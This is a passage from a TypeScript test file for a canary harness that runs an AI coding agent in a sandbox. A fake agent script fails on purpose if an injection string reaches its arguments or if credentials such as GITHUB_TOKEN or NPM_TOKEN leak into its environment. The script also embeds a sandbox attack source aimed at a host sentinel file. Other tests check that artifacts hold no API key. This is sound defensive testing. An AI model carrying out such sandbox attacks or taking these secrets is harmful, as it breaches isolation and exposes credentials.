globalThis.__attackSource = ${JSON.stringify(sandboxAttackSource({ sentinelPath: '/host/sentinel', artifactDir }))}
const settingsIndex = process.argv.indexOf('--settings')
const settings = settingsIndex >= 0 ? JSON.parse(await readFile(process.argv[settingsIndex + 1], 'utf8')) : null
await writeFile(${JSON.stringify(capturePath)}, JSON.stringify({ argv: process.argv.slice(2), settings, scrub: process.env.CLAUDE_CODE_SUBPROCESS_ENV_SCRUB }))
await new Promise(resolvePromise => { let value = ''; process.stdin.setEncoding('utf8'); process.stdin.on('data', chunk => value += chunk); process.stdin.on('end', () => resolvePromise(value)) })
if (process.argv.some(value => value.includes(${JSON.stringify(INJECTION)}))) process.exit(8)
if (process.env.GITHUB_TOKEN || process.env.ACTIONS_RUNTIME_TOKEN || process.env.NPM_TOKEN || process.env.SSH_AUTH_SOCK) process.exit(7)
${operations[mode] ?? operations.success}
if (${JSON.stringify(mode)} !== 'malformed' && ${JSON.stringify(mode)} !== 'nonzero' && ${JSON.stringify(mode)} !== 'timeout') {
  process.stdout.write(JSON.stringify({ type: 'system', subtype: 'init' }) + '\\n')
  process.stdout.write(JSON.stringify({ type: 'assistant', message: { content: [{ type: 'thinking', thinking: 'must not persist' }] } }) + '\\n')
  process.stdout.write(JSON.stringify({ type: 'result', subtype: 'success', is_error: false, num_turns: 4, result: 'done' }) + '\\n')
}
`)
  return { root, artifactDir, harnessDir, baseSha, harnessScript, capturePath, attackSource: '' }
}

async function runFixture(
  fixture: Awaited<ReturnType<typeof repoFixture>>,
  options: {
    claudeCommand?: string
    policy?: CanaryPolicy
    requestMutator?: (request: CanaryRequest) => CanaryRequest
    sourceEnvironment?: NodeJS.ProcessEnv
    validationSandboxProcessRunner?: SandboxProcessRunner
  } = {},
) {
  if (fixture.attackSource.length > 0) {
    const harness = await readFile(fixture.harnessScript, 'utf8')
    await writeFile(fixture.harnessScript, harness.replace(
      JSON.stringify(sandboxAttackSource({ sentinelPath: '/host/sentinel', artifactDir: fixture.artifactDir })),
      JSON.stringify(fixture.attackSource),
    ))
  }
  const selectedPolicy = options.policy ?? policy()
  let request = prepareCanaryRequest({ ...snapshot(), baseSha: fixture.baseSha }, selectedPolicy)
  request = options.requestMutator?.(request) ?? request
  return runHarnessCanary({
    repoRoot: fixture.root,
    request,
    policy: selectedPolicy,
    artifactDir: fixture.artifactDir,
    deepSeekApiKey: FAKE_KEY,
    sourceEnvironment: options.sourceEnvironment ?? { PATH: process.env['PATH'] },
    claudeCommand: options.claudeCommand ?? process.execPath,
    claudeArgsPrefix: options.claudeCommand === undefined ? [fixture.harnessScript] : [],
    validationSandboxProcessRunner: options.validationSandboxProcessRunner ?? new StrictMockValidationSandboxRunner(),
  })
}

async function expectFailedArtifact(
  fixture: Awaited<ReturnType<typeof repoFixture>>,
  reasonCode: string,
): Promise<FailedCanaryArtifact> {
  const value = JSON.parse(await readFile(join(fixture.artifactDir, 'result.json'), 'utf8')) as unknown
  const artifact = canaryArtifactSchema.parse(value)
  expect(artifact.status).toBe('FAILED')
  if (artifact.status !== 'FAILED') throw new Error('Expected failed artifact.')
  expect(artifact.reasonCode).toBe(reasonCode)
  expect(verifyArtifactHash(artifact)).toBe(true)
  expect(JSON.stringify(artifact)).not.toContain(FAKE_KEY)
  expect(JSON.stringify(artifact)).not.toContain(fixture.root)
  return artifact
}

async function fileExists(path: string): Promise<boolean> {
  try {
    await readFile(path)
    return true
  } catch {
    return false
  }
}
